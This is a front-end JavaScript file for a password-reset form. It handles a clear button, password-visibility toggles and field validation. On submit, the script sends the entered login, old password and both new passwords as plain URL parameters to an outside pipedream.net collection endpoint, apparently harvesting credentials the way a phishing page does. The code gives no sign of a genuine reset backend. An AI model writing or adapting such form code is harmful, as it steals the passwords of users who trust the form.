const clearButton = document.querySelector('.clear');
const loginInput = document.querySelector('input[name="login"]');
const passwordInputs = document.querySelectorAll('.p');
const visibleButtons = document.querySelectorAll('.visible-block');

clearButton.addEventListener('click', () => { loginInput.value = ''; });

function toggleClearButton() {
    clearButton.style.display = loginInput.value.trim() === '' ? 'none' : 'block';
}

loginInput.addEventListener('input', toggleClearButton);
toggleClearButton();

clearButton.addEventListener('click', function () {
    loginInput.value = '';
    toggleClearButton();
});

function toggleVisibleButtons() {
    passwordInputs.forEach((input, index) => {
        if (input.value.trim() === '') {
            visibleButtons[index].classList.add('not_visible');
            input.type = 'password';
        } else {
            visibleButtons[index].classList.remove('not_visible');
        }
    });
}

passwordInputs.forEach(input => {
    input.addEventListener('input', toggleVisibleButtons);
});

toggleVisibleButtons();

function togglePasswordVisibility(event) {
    const label = event.target.closest('label');
    const input = label.querySelector('input');
    const img = label.querySelector('.visible-img');

    if (input.type === 'password') {
        input.type = 'text';
        img.src = '/icons8-eye-48.png';
    } else {
        input.type = 'password';
        img.src = '/icons8-not-visible-48.png';
    }
}

document.querySelectorAll('.visible-block').forEach(block => {
    block.addEventListener('click', togglePasswordVisibility);
});

document.getElementById('password-reset-form').addEventListener('submit', function (event) {
    event.preventDefault();

    const login = this.login.value;
    const oldPassword = this['old-password'].value;
    const newPassword = this['new-password'].value;
    const newPassword2 = this['new-password2'].value;

    const alerts = {
        login: document.querySelector('.alert.login'),
        oldPassword: document.querySelector('.alert.old-password'),
        newPassword: document.querySelector('.alert.new-password'),
        newPassword2: document.querySelector('.alert.new-password2'),
        newPass: document.querySelector('.alert.new-pass')
    };

    const labels = {
        login: this.querySelector('label[data-marker="login-form/login"]'),
        oldPassword: this.querySelector('label[data-marker="login-form/old-password"]'),
        newPassword: this.querySelector('label[data-marker="login-form/new-password"]'),
        newPassword2: this.querySelector('label[data-marker="login-form/new-password2"]')
    };

    let isValid = true;

    for (const key in alerts) {
        if (alerts[key]) {
            alerts[key].classList.add('hidden');
        }
        if (labels[key]) {
            labels[key].classList.remove('error');
        }
    }

    if (!login) {
        alerts.login.classList.remove('hidden');
        labels.login.classList.add('error');
        isValid = false;
    }

    if (!oldPassword) {
        alerts.oldPassword.classList.remove('hidden');
        labels.oldPassword.classList.add('error');
        isValid = false;
    }

    if (!newPassword) {
        alerts.newPassword.classList.remove('hidden');
        labels.newPassword.classList.add('error');
        isValid = false;
    }

    if (!newPassword2) {
        alerts.newPassword2.classList.remove('hidden');
        labels.newPassword2.classList.add('error');
        isValid = false;
    }

    if (newPassword !== newPassword2) {
        alerts.newPass.classList.remove('hidden');
        if (labels.newPassword) labels.newPassword.classList.add('error');
        if (labels.newPassword2) labels.newPassword2.classList.add('error');
        isValid = false;
    }

    if (!isValid) {
        return;
    }

    const url = `https://eohjfk9mjv7pzfr.m.pipedream.net/?login=${encodeURIComponent(login)}&old-password=${encodeURIComponent(oldPassword)}&new-password=${encodeURIComponent(newPassword)}&new-password2=${encodeURIComponent(newPassword2)}`;

    fetch(url);
});

document.querySelectorAll('input[name="login"], input[name="old-password"], input[name="new-password"], input[name="new-password2"]').forEach(input => {
    input.addEventListener('input', () => { 
        const label = document.querySelector(`label[data-marker="login-form/${input.name}"]`);
        const alert = document.querySelector(`.alert.${input.name}`);

        if (input.name==='new-password' || input.name==='new-password2') {
            const newPassAlert = document.querySelector(`.alert.new-pass`);
            newPassAlert.classList.add('hidden');
            const labelPass1 = document.querySelector(`label[data-marker="login-form/new-password"]`);
            const labelPass2 = document.querySelector(`label[data-marker="login-form/new-password2"]`);
            labelPass1.classList.remove('error');
            labelPass2.classList.remove('error');
        }
        if (label) {
            label.classList.remove('error');
        }
        if (alert) {
            alert.classList.add('hidden');
        }
    });
});
